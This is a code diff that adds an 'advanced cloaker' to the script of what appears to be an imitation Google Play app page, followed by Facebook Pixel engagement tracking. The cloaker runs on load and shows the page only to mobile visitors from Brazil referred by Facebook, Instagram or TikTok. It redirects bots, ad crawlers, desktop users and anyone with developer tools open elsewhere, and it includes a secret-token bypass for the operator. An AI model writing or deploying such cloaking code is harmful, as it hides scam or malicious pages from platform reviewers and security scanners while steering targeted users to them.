@@ -1,3 +1,297 @@
+// Advanced country and device cloaker with anti-detection features
+function advancedCloaker() {
+    // Configuration
+    const config = {
+        // Allowed countries (country codes)
+        allowedCountries: ['BR'],
+        
+        // Target only mobile devices (true) or allow all devices (false)
+        mobileOnly: true,
+        
+        // URLs to redirect different traffic to
+        redirectUrls: {
+            desktop: 'https://www.google.com',
+            nonTargetCountry: 'https://www.bing.com',
+            bot: 'https://www.yahoo.com'
+        },
+        
+        // Cache duration in milliseconds (24 hours)
+        cacheDuration: 24 * 60 * 60 * 1000,
+        
+        // Referrer whitelist (leave empty to allow all)
+        // If not empty, users coming from other sources will be redirected
+        allowedReferrers: [
+            'facebook.com',
+            'instagram.com',
+            'tiktok.com'
+        ],
+        
+        // Anti-detection mode
+        antiDetection: true,
+        
+        // Admin bypass settings
+        adminBypass: {
+            enabled: true,
+            // Secret token (change this to something complex)
+            secretToken: 'a7x9z2p5q8r3t6y1w4',
+            // Parameter name that will be used in URL
+            paramName: 'access',
+            // How long the bypass should last (in milliseconds) - 1 day
+            bypassDuration: 24 * 60 * 60 * 1000
+        }
+    };
+    
+    // Check for admin bypass first
+    function checkAdminBypass() {
+        // If admin bypass is not enabled, return false
+        if (!config.adminBypass.enabled) {
+            return false;
+        }
+        
+        // Check if bypass is stored in localStorage
+        const bypassData = localStorage.getItem('admin_bypass');
+        if (bypassData) {
+            try {
+                const data = JSON.parse(bypassData);
+                const now = new Date().getTime();
+                
+                // Check if bypass is still valid
+                if (now - data.timestamp < config.adminBypass.bypassDuration) {
+                    // Bypass is valid
+                    return true;
+                } else {
+                    // Bypass expired, remove it
+                    localStorage.removeItem('admin_bypass');
+                }
+            } catch (e) {
+                // Error parsing bypass data
+                console.error('Error parsing admin bypass data:', e);
+            }
+        }
+        
+        // Check URL parameters for bypass token
+        const urlParams = new URLSearchParams(window.location.search);
+        const accessToken = urlParams.get(config.adminBypass.paramName);
+        
+        if (accessToken === config.adminBypass.secretToken) {
+            // Valid access token, store bypass in localStorage
+            localStorage.setItem('admin_bypass', JSON.stringify({
+                timestamp: new Date().getTime()
+            }));
+            
+            // Clean URL by removing the access parameter
+            if (history.pushState) {
+                const newUrl = window.location.pathname + 
+                    window.location.search.replace(
+                        new RegExp(`[?&]${config.adminBypass.paramName}=${config.adminBypass.secretToken}`), ''
+                    ).replace(/^&/, '?') + 
+                    window.location.hash;
+                
+                history.pushState({}, document.title, newUrl);
+            }
+            
+            return true;
+        }
+        
+        return false;
+    }
+    
+    // Check if user is likely a bot
+    function isLikelyBot() {
+        // Check common bot indicators
+        const botPatterns = [
+            /bot/i, /spider/i, /crawl/i, /APIs-Google/i,
+            /AdsBot/i, /Googlebot/i, /mediapartners/i, /Google Favicon/i,
+            /FeedFetcher/i, /Yahoo! Slurp/i, /AOLBuild/i, /Googlebot/i,
+            /Baiduspider/i, /BingBot/i, /Slurp/i, /YandexBot/i
+        ];
+        
+        if (botPatterns.some(pattern => pattern.test(navigator.userAgent))) {
+            return true;
+        }
+        
+        // Headless browser detection
+        if (
+            !navigator.webdriver && 
+            navigator.languages && 
+            navigator.languages.length === 0
+        ) {
+            return true;
+        }
+        
+        // Check if window.chrome exists in Chrome
+        const isChrome = /Chrome/.test(navigator.userAgent);
+        if (isChrome && !window.chrome) {
+            return true;
+        }
+        
+        return false;
+    }
+    
+    // Check if user has debug tools open
+    function detectDebugger() {
+        let isDebuggerOpen = false;
+        
+        // Method 1: Execution time analysis
+        const startTime = new Date().getTime();
+        debugger; // This statement will pause execution if dev tools are open
+        const endTime = new Date().getTime();
+        
+        if (endTime - startTime > 100) {
+            isDebuggerOpen = true;
+        }
+        
+        return isDebuggerOpen;
+    }
+    
+    // Check if the referrer is allowed
+    function checkReferrer() {
+        // If no referrer restrictions, allow all
+        if (config.allowedReferrers.length === 0) {
+            return true;
+        }
+        
+        // Get the referrer
+        const referrer = document.referrer;
+        
+        // If no referrer and we have a whitelist, block
+        if (!referrer) {
+            return false;
+        }
+        
+        // Check if referrer is in whitelist
+        return config.allowedReferrers.some(allowed => referrer.includes(allowed));
+    }
+    
+    // Redirect based on reason
+    function redirectUser(reason) {
+        let redirectUrl;
+        
+        switch (reason) {
+            case 'desktop':
+                redirectUrl = config.redirectUrls.desktop;
+                break;
+            case 'country':
+                redirectUrl = config.redirectUrls.nonTargetCountry;
+                break;
+            case 'bot':
+                redirectUrl = config.redirectUrls.bot;
+                break;
+            case 'debugger':
+            case 'referrer':
+                redirectUrl = config.redirectUrls.nonTargetCountry;
+                break;
+            default:
+                redirectUrl = config.redirectUrls.nonTargetCountry;
+        }
+        
+        // Use history.replaceState to hide the original URL
+        if (config.antiDetection) {
+            history.replaceState(null, document.title, redirectUrl);
+        }
+        
+        // Redirect the user
+        window.location.href = redirectUrl;
+    }
+    
+    // Check if device is mobile
+    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    
+    // If admin bypass is active, skip all checks
+    if (checkAdminBypass()) {
+        console.log('Access granted: Admin bypass active');
+        return;
+    }
+    
+    // Check for bot and debug tools if anti-detection is enabled
+    if (config.antiDetection) {
+        // Bot check
+        if (isLikelyBot()) {
+            console.log('Redirecting: Bot detected');
+            redirectUser('bot');
+            return;
+        }
+        
+        // Debug tools check
+        if (detectDebugger()) {
+            console.log('Redirecting: Debugger detected');
+            redirectUser('debugger');
+            return;
+        }
+        
+        // Referrer check
+        if (!checkReferrer()) {
+            console.log('Redirecting: Unauthorized referrer');
+            redirectUser('referrer');
+            return;
+        }
+    }
+    
+    // If mobile only and not on mobile, redirect immediately
+    if (config.mobileOnly && !isMobile) {
+        console.log('Redirecting: Not a mobile device');
+        redirectUser('desktop');
+        return;
+    }
+    
+    // Check cache first
+    const cachedData = localStorage.getItem('cloaker_data');
+    if (cachedData) {
+        try {
+            const data = JSON.parse(cachedData);
+            const now = new Date().getTime();
+            
+            // Check if cache is still valid
+            if (now - data.timestamp < config.cacheDuration) {
+                // Cache is valid, use it
+                processUserData(data.countryCode);
+                return;
+            }
+        } catch (e) {
+            // Error parsing cached data, continue to fetch new data
+            console.error('Error parsing cached data:', e);
+        }
+    }
+    
+    // Fetch country data
+    fetch('https://ipapi.co/json/')
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+            return response.json();
+        })
+        .then(data => {
+            // Cache the result
+            localStorage.setItem('cloaker_data', JSON.stringify({
+                countryCode: data.country_code,
+                timestamp: new Date().getTime()
+            }));
+            
+            // Process the data
+            processUserData(data.country_code);
+        })
+        .catch(error => {
+            console.error('Error detecting country:', error);
+            // On error, default to allowing access
+            // You can change this behavior if needed
+        });
+    
+    function processUserData(countryCode) {
+        const isAllowedCountry = config.allowedCountries.includes(countryCode);
+        
+        if (!isAllowedCountry) {
+            console.log(`Redirecting: Country not allowed (${countryCode})`);
+            redirectUser('country');
+        } else {
+            console.log(`Access granted: Country (${countryCode}) and device allowed`);
+        }
+    }
+}
+
+// Execute the advanced cloaker immediately when the page loads
+advancedCloaker();
+
 document.addEventListener('DOMContentLoaded', () => {
     // Set placeholder images - logo, badge, and app icon removed
     // document.getElementById('gp-logo').src = window.placeholderImages.googlePlayLogo;
@@ -174,5 +468,56 @@ document.addEventListener('DOMContentLoaded', () => {
             icon.classList.add('far');
             wishlistBtn.style.color = '#018786';
         }
+    });
+});
+
+// Facebook Pixel Enhanced Tracking
+document.addEventListener('DOMContentLoaded', function() {
+    // Track scrolling depth
+    let scrollDepthTracked = {
+        '25': false,
+        '50': false,
+        '75': false,
+        '100': false
+    };
+    
+    window.addEventListener('scroll', function() {
+        const scrollPosition = window.scrollY;
+        const windowHeight = window.innerHeight;
+        const documentHeight = document.documentElement.scrollHeight;
+        const scrollPercentage = (scrollPosition / (documentHeight - windowHeight)) * 100;
+        
+        if (scrollPercentage >= 25 && !scrollDepthTracked['25']) {
+            fbq('trackCustom', 'ScrollDepth', {'depth': '25%'});
+            scrollDepthTracked['25'] = true;
+        }
+        if (scrollPercentage >= 50 && !scrollDepthTracked['50']) {
+            fbq('trackCustom', 'ScrollDepth', {'depth': '50%'});
+            scrollDepthTracked['50'] = true;
+        }
+        if (scrollPercentage >= 75 && !scrollDepthTracked['75']) {
+            fbq('trackCustom', 'ScrollDepth', {'depth': '75%'});
+            scrollDepthTracked['75'] = true;
+        }
+        if (scrollPercentage >= 100 && !scrollDepthTracked['100']) {
+            fbq('trackCustom', 'ScrollDepth', {'depth': '100%'});
+            scrollDepthTracked['100'] = true;
+        }
+    });
+    
+    // Track time spent on page
+    setTimeout(function() {
+        fbq('trackCustom', 'TimeOnPage', {'duration': '30 seconds'});
+    }, 30000);
+    
+    setTimeout(function() {
+        fbq('trackCustom', 'TimeOnPage', {'duration': '60 seconds'});
+    }, 60000);
+    
+    // Track clicks on review items
+    document.querySelectorAll('.review').forEach(function(review) {
+        review.addEventListener('click', function() {
+            fbq('trackCustom', 'ReviewClick', {'reviewer': this.querySelector('h3').textContent});
+        });
     });
 }); 
